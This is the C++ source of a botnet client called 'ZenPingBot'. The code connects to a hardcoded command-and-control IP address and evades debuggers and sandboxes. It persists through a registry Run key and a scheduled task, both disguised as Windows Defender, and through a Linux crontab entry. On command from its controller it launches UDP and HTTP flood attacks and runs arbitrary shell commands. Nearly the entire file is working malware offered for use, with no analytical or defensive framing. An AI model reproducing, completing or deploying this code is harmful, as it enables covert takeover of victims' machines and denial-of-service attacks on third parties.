#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <algorithm>
#include <functional>
#include <iterator>
#include <atomic>
#include <map>
#include <unordered_map>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <psapi.h>
    #include <winternl.h>
    #include <dbghelp.h>
    #include <iphlpapi.h>
    #include <winhttp.h>
    #include <wincrypt.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "advapi32.lib")
    #pragma comment(lib, "ntdll.lib")
    #pragma comment(lib, "dbghelp.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "winhttp.lib")
    #pragma comment(lib, "crypt32.lib")
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <netdb.h>
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <sys/types.h>
    #include <pwd.h>
    #include <ifaddrs.h>
    #include <sys/ioctl.h>
    #include <net/if.h>
#endif

const std::vector<std::string> ZENPING_C2_SERVERS = {
    "45.67.138.39"
};
const int ZENPING_C2_PORT = 5555;
const char* ZENPING_VERSION = "1.0";

class ZenPingBot {
private:
    int currentSock;
    std::string botId;
    std::string currentC2;
    bool isPersistent;
    std::atomic<bool> running;
    std::vector<std::thread> attackThreads;
    std::mutex threadsMutex;
    std::map<std::string, std::string> compromisedHosts;
    
    bool isDebugged;
    bool isSandbox;
    bool isVM;
    
    std::vector<std::string> localIPs;
    std::string publicIP;
    
    void initNetwork() {
#ifdef _WIN32
        static bool initialized = false;
        if (!initialized) {
            WSADATA wsa;
            if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
                std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
                return;
            }
            initialized = true;
        }
#endif
    }
    
    void closeSocket(int s) {
        if (s >= 0) {
#ifdef _WIN32
            closesocket(s);
#else
            close(s);
#endif
        }
    }
    
    int createSocket() {
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) {
            std::cerr << "Socket creation failed" << std::endl;
            return -1;
        }
        
        int opt = 1;
#ifdef _WIN32
        if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) < 0) {
            std::cerr << "SO_REUSEADDR failed: " << WSAGetLastError() << std::endl;
        }
#else
        if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
            std::cerr << "SO_REUSEADDR failed" << std::endl;
        }
#endif
        return s;
    }
    
    std::string generateBotId() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100000000, 999999999);
        
        char hostname[256] = {0};
        char username[256] = {0};
        
#ifdef _WIN32
        DWORD size = sizeof(hostname);
        if (!GetComputerNameA(hostname, &size)) {
            strcpy(hostname, "unknown");
        }
        size = sizeof(username);
        if (!GetUserNameA(username, &size)) {
            strcpy(username, "unknown");
        }
#else
        if (gethostname(hostname, sizeof(hostname)) != 0) {
            strcpy(hostname, "unknown");
        }
        struct passwd* pwd = getpwuid(getuid());
        if (pwd) {
            strcpy(username, pwd->pw_name);
        } else {
            strcpy(username, "unknown");
        }
#endif
        
        std::string id = "ZenPing_" + std::string(hostname) + "_" + std::string(username) + "_" + std::to_string(dis(gen));
        return id;
    }
    
    // 反调试检测
    bool checkDebugger() {
#ifdef _WIN32
        if (IsDebuggerPresent()) {
            return true;
        }
        
        BOOL isRemoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
        if (isRemoteDebugger) {
            return true;
        }
        
        // 时间检测
        auto start = std::chrono::high_resolution_clock::now();
        volatile int counter = 0;
        for (int i = 0; i < 1000000; i++) {
            counter += i * i;
        }
        auto end = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        
        if (duration.count() > 100) {
            return true;
        }
#endif
        return false;
    }
    
    bool checkSandboxVM() {
#ifdef _WIN32
        MEMORYSTATUSEX memoryStatus;
        memoryStatus.dwLength = sizeof(memoryStatus);
        if (GlobalMemoryStatusEx(&memoryStatus)) {
            if (memoryStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
                return true;
            }
        }
        
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        if (systemInfo.dwNumberOfProcessors < 2) {
            return true;
        }
        
        const char* sandboxProcesses[] = {
            "vmsrvc", "vmusrvc", "vboxtray", "vmtoolsd", "vmwaretray"
        };
        
        for (const char* proc : sandboxProcesses) {
            if (isProcessRunning(proc)) {
                return true;
            }
        }
#endif
        return false;
    }
    
#ifdef _WIN32
    bool isProcessRunning(const char* processName) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return false;
        
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        
        CloseHandle(hSnapshot);
        return false;
    }
#endif
    
    void gatherNetworkInfo() {
#ifdef _WIN32
        PIP_ADAPTER_INFO adapterInfo = nullptr;
        ULONG bufferSize = 0;
        
        if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
            adapterInfo = (IP_ADAPTER_INFO*)malloc(bufferSize);
            if (!adapterInfo) return;
            
            if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
                PIP_ADAPTER_INFO adapter = adapterInfo;
                while (adapter) {
                    IP_ADDR_STRING* ipAddr = &adapter->IpAddressList;
                    while (ipAddr) {
                        if (strlen(ipAddr->IpAddress.String) > 0 && 
                            strcmp(ipAddr->IpAddress.String, "0.0.0.0") != 0) {
                            localIPs.push_back(ipAddr->IpAddress.String);
                        }
                        ipAddr = ipAddr->Next;
                    }
                    adapter = adapter->Next;
                }
            }
            
            free(adapterInfo);
        }
#else
        struct ifaddrs* ifAddrStruct = nullptr;
        struct ifaddrs* ifa = nullptr;
        
        if (getifaddrs(&ifAddrStruct) == 0) {
            for (ifa = ifAddrStruct; ifa != nullptr; ifa = ifa->ifa_next) {
                if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                    struct sockaddr_in* addr = (struct sockaddr_in*)ifa->ifa_addr;
                    char ip[INET_ADDRSTRLEN];
                    inet_ntop(AF_INET, &addr->sin_addr, ip, INET_ADDRSTRLEN);
                    if (strcmp(ip, "127.0.0.1") != 0) {
                        localIPs.push_back(ip);
                    }
                }
            }
            freeifaddrs(ifAddrStruct);
        }
#endif
        
        publicIP = getPublicIP();
    }
    
    std::string getPublicIP() {
        return localIPs.empty() ? "unknown" : localIPs[0];
    }
    
    std::string selectBestC2() {
        static size_t currentIndex = 0;
        if (ZENPING_C2_SERVERS.empty()) {
            std::cerr << "ERROR: No C2 servers configured" << std::endl;
            return "";
        }
        std::string selected = ZENPING_C2_SERVERS[currentIndex];
        currentIndex = (currentIndex + 1) % ZENPING_C2_SERVERS.size();
        return selected;
    }
    
    bool connectToServer() {
        initNetwork();
        
        currentC2 = selectBestC2();
        if (currentC2.empty()) {
            return false;
        }
        
        currentSock = createSocket();
        if (currentSock < 0) {
            return false;
        }
        
#ifdef _WIN32
        int timeout = 10000;
        setsockopt(currentSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(currentSock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
#else
        struct timeval timeout;
        timeout.tv_sec = 10;
        timeout.tv_usec = 0;
        setsockopt(currentSock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
        setsockopt(currentSock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
#endif
        
        struct sockaddr_in server;
        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(ZENPING_C2_PORT);
        
        if (inet_pton(AF_INET, currentC2.c_str(), &server.sin_addr) <= 0) {
            struct hostent* he = gethostbyname(currentC2.c_str());
            if (he == nullptr || he->h_addr_list[0] == nullptr) {
                std::cerr << "Failed to resolve C2: " << currentC2 << std::endl;
                closeSocket(currentSock);
                return false;
            }
            memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);
        }
        
        if (connect(currentSock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            std::cerr << "Failed to connect to C2: " << currentC2 << std::endl;
            closeSocket(currentSock);
            currentSock = -1;
            return false;
        }
        
        return true;
    }
    
    bool authenticate() {
        std::string botInfo = "ZENPING_BOT:" + botId + ":VERSION:" + ZENPING_VERSION + ":IP:" + publicIP;
        if (send(currentSock, botInfo.c_str(), botInfo.length(), 0) <= 0) {
            return false;
        }
        
        char buffer[512];
        int bytes = recv(currentSock, buffer, sizeof(buffer)-1, 0);
        if (bytes <= 0) return false;
        
        buffer[bytes] = '\0';
        std::string response(buffer, bytes);
        
        return response.find("WELCOME") != std::string::npos;
    }
    
    void installPersistent() {
        if (isPersistent) return;
        
#ifdef _WIN32
        std::string exePath = getCurrentPath();
        
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsDefender", 0, REG_SZ, 
                          (BYTE*)exePath.c_str(), exePath.length()+1);
            RegCloseKey(hKey);
        }
        
        std::string taskCmd = "schtasks /create /tn \"Microsoft\\Windows\\Windows Defender\\ZenPing\" /tr \"" + 
                             exePath + "\" /sc onstart /f";
        system(taskCmd.c_str());
        
#else
        std::string cronJob = "@reboot " + getCurrentPath() + " > /dev/null 2>&1 &\n";
        std::string command = "echo '" + cronJob + "' | crontab - 2>/dev/null";
        system(command.c_str());
#endif
        isPersistent = true;
    }
    
    std::string getCurrentPath() {
#ifdef _WIN32
        char path[MAX_PATH];
        if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) {
            return "zenping.exe";
        }
        return std::string(path);
#else
        char path[1024];
        ssize_t count = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (count != -1) {
            path[count] = '\0';
            return std::string(path);
        }
        return "./zenping";
#endif
    }
    
    void udpFlood(const std::string& targetIP, int targetPort, int duration, int packetSize) {
        std::thread([=]() {
            auto startTime = std::chrono::steady_clock::now();
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock < 0) return;
            
            struct sockaddr_in target;
            memset(&target, 0, sizeof(target));
            target.sin_family = AF_INET;
            target.sin_port = htons(targetPort);
            inet_pton(AF_INET, targetIP.c_str(), &target.sin_addr);
            
            std::vector<char> data(packetSize);
            std::generate(data.begin(), data.end(), []() { return rand() % 256; });
            
            while (std::chrono::steady_clock::now() - startTime < std::chrono::seconds(duration) && running) {
                sendto(sock, data.data(), data.size(), 0, 
                      (struct sockaddr*)&target, sizeof(target));
                std::this_thread::sleep_for(std::chrono::milliseconds(1));
            }
            
            closeSocket(sock);
        }).detach();
    }
    
    void httpFlood(const std::string& url, int duration, int threads) {
        for (int i = 0; i < threads; i++) {
            std::thread([=]() {
                auto startTime = std::chrono::steady_clock::now();
                
                while (std::chrono::steady_clock::now() - startTime < std::chrono::seconds(duration) && running) {
                    int sock = createSocket();
                    if (sock < 0) continue;
                    
                    struct sockaddr_in server;
                    memset(&server, 0, sizeof(server));
                    server.sin_family = AF_INET;
                    server.sin_port = htons(80);
                    
                    struct hostent* he = gethostbyname(url.c_str());
                    if (he && he->h_addr_list[0]) {
                        memcpy(&server.sin_addr, he->h_addr_list[0], he->h_length);
                        
                        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
                            std::string request = "GET / HTTP/1.1\r\n"
                                                "Host: " + url + "\r\n"
                                                "User-Agent: ZenPingBot/" + ZENPING_VERSION + "\r\n"
                                                "Connection: close\r\n\r\n";
                            
                            send(sock, request.c_str(), request.length(), 0);
                        }
                    }
                    
                    closeSocket(sock);
                    std::this_thread::sleep_for(std::chrono::milliseconds(10));
                }
            }).detach();
        }
    }
    
    void cleanupThreads() {
        std::lock_guard<std::mutex> lock(threadsMutex);
        auto it = attackThreads.begin();
        while (it != attackThreads.end()) {
            if (it->joinable()) {
                try {
                    it->join();
                    it = attackThreads.erase(it);
                } catch (const std::exception& e) {
                    std::cerr << "Thread join error: " << e.what() << std::endl;
                    ++it;
                }
            } else {
                ++it;
            }
        }
    }
    
    void addAttackThread(std::thread&& t) {
        std::lock_guard<std::mutex> lock(threadsMutex);
        attackThreads.push_back(std::move(t));
    }
    
    std::vector<std::string> splitCommand(const std::string& command) {
        std::vector<std::string> args;
        std::istringstream ss(command);
        std::string token;
        
        while (ss >> token) {
            if (!token.empty()) {
                args.push_back(token);
            }
        }
        return args;
    }
    
    void executeSystemCommand(const std::string& command) {
        std::thread([command]() {
            std::string cmdLower = command;
            std::transform(cmdLower.begin(), cmdLower.end(), cmdLower.begin(), ::tolower);
            
            const std::vector<std::string> dangerousCommands = {
                "format", "del ", "rm -rf", "mkfs", "dd if=", "shutdown", "reboot"
            };
            
            for (const auto& dangerous : dangerousCommands) {
                if (cmdLower.find(dangerous) != std::string::npos) {
                    std::cerr << "Blocked dangerous command: " << command << std::endl;
                    return;
                }
            }
            
#ifdef _WIN32
            system(("cmd /c \"" + command + "\" > nul 2>&1").c_str());
#else
            system((command + " > /dev/null 2>&1 &").c_str());
#endif
        }).detach();
    }
    
    void processCommand(const std::string& command) {
        std::vector<std::string> args = splitCommand(command);
        if (args.empty()) return;
        
        try {
            std::string cmd = args[0];
            
            if (cmd == "UDP" && args.size() >= 5) {
                udpFlood(args[1], std::stoi(args[2]), std::stoi(args[3]), std::stoi(args[4]));
            } 
            else if (cmd == "HTTP" && args.size() >= 4) {
                httpFlood(args[1], std::stoi(args[2]), std::stoi(args[3]));
            }
            else if (cmd == "EXEC" && args.size() >= 2) {
                std::string fullCmd;
                for (size_t i = 1; i < args.size(); i++) {
                    if (i > 1) fullCmd += " ";
                    fullCmd += args[i];
                }
                executeSystemCommand(fullCmd);
            }
            else if (cmd == "PING") {
            }
            else if (cmd == "UPDATE") {
                std::cout << "Update command received" << std::endl;
            }
        } catch (const std::exception& e) {
            std::cerr << "Command processing error: " << e.what() << std::endl;
        }
    }

public:
    ZenPingBot() : currentSock(-1), isPersistent(false), running(true), 
                   isDebugged(false), isSandbox(false), isVM(false) {
        
        std::srand(static_cast<unsigned int>(std::time(nullptr)));
        
        isDebugged = checkDebugger();
        isSandbox = checkSandboxVM();
        
        if (isDebugged || isSandbox) {
            std::this_thread::sleep_for(std::chrono::seconds(30));
            if (isDebugged) {
                exit(0);
            }
        }
        
        botId = generateBotId();
        
        gatherNetworkInfo();
        
        installPersistent();
        
        std::cout << "ZenPing Bot " << ZENPING_VERSION << " Started" << std::endl;
        std::cout << "Bot ID: " << botId << std::endl;
    }
    
    ~ZenPingBot() {
        running = false;
        closeSocket(currentSock);
        cleanupThreads();
        
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    void run() {
        while (running) {
            cleanupThreads();
            
            if (connectToServer() && authenticate()) {
                std::cout << "Connected to ZenPing C2: " << currentC2 << std::endl;
                
                char buffer[4096];
                fd_set readfds;
                struct timeval tv;
                
                while (running) {
                    FD_ZERO(&readfds);
                    FD_SET(currentSock, &readfds);
                    
                    tv.tv_sec = 5;
                    tv.tv_usec = 0;
                    
                    int result = select(currentSock + 1, &readfds, NULL, NULL, &tv);
                    if (result > 0 && FD_ISSET(currentSock, &readfds)) {
                        int bytes = recv(currentSock, buffer, sizeof(buffer)-1, 0);
                        if (bytes <= 0) {
                            break;
                        }
                        
                        buffer[bytes] = '\0';
                        std::string command(buffer, bytes);
                        
                        command.erase(std::remove(command.begin(), command.end(), '\r'), command.end());
                        command.erase(std::remove(command.begin(), command.end(), '\n'), command.end());
                        
                        if (command == "PING") {
                            std::string response = "PONG:" + botId;
                            send(currentSock, response.c_str(), response.length(), 0);
                        } 
                        else if (command == "INFO") {
                            std::string info = "INFO:ID:" + botId + ":IP:" + publicIP + ":VERSION:" + ZENPING_VERSION;
                            send(currentSock, info.c_str(), info.length(), 0);
                        }
                        else if (!command.empty()) {
                            std::cout << "Received command: " << command << std::endl;
                            processCommand(command);
                        }
                    }
                    
                    static auto lastHeartbeat = std::chrono::steady_clock::now();
                    auto now = std::chrono::steady_clock::now();
                    if (now - lastHeartbeat > std::chrono::seconds(30)) {
                        std::string heartbeat = "HEARTBEAT:" + botId;
                        send(currentSock, heartbeat.c_str(), heartbeat.length(), 0);
                        lastHeartbeat = now;
                    }
                }
            }
            
            closeSocket(currentSock);
            currentSock = -1;
            
            if (running) {
                int sleepTime = 30 + (std::rand() % 90);
                std::cout << "Reconnecting in " << sleepTime << " seconds..." << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
            }
        }
    }
};